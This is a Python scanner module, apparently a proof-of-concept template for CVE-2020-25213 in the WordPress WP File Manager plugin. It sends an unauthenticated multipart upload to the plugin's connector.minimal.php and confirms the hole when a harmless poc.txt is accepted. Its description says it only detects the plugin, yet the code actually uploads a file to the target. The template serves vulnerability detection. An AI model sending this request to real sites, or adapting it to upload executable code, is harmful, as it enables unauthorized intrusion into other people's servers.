import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''WP File Manager RCE''',
        "description": '''The vulnerability allows unauthenticated remote attackers to upload .php files. This template only detects the plugin, not its vulnerability.''',
        "severity": "critical",
        "references": [
            "https://plugins.trac.wordpress.org/changeset/2373068", 
            "https://github.com/w4fz5uck5/wp-file-manager-0day"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2020-25213",
            "cwe-id": "CWE-434"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2020", "wordpress", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"""
        method = "POST"
        data = """--------------------------ca81ac1fececda48
Content-Disposition: form-data; name="reqid"

17457a1fe6959
--------------------------ca81ac1fececda48
Content-Disposition: form-data; name="cmd"

upload
--------------------------ca81ac1fececda48
Content-Disposition: form-data; name="target"

l1_Lw
--------------------------ca81ac1fececda48
Content-Disposition: form-data; name="mtime[]"

1576045135
--------------------------ca81ac1fececda48
Content-Disposition: form-data; name="upload[]"; filename="poc.txt"
Content-Type: text/plain

poc-test
--------------------------ca81ac1fececda48--"""
        headers = {'Accept': '*/*', 'Content-Type': 'multipart/form-data; boundary=------------------------ca81ac1fececda48'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""poc.txt""" in resp0.text and """added""" in resp0.text) and ("""application/json""" in str(resp0.headers)) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url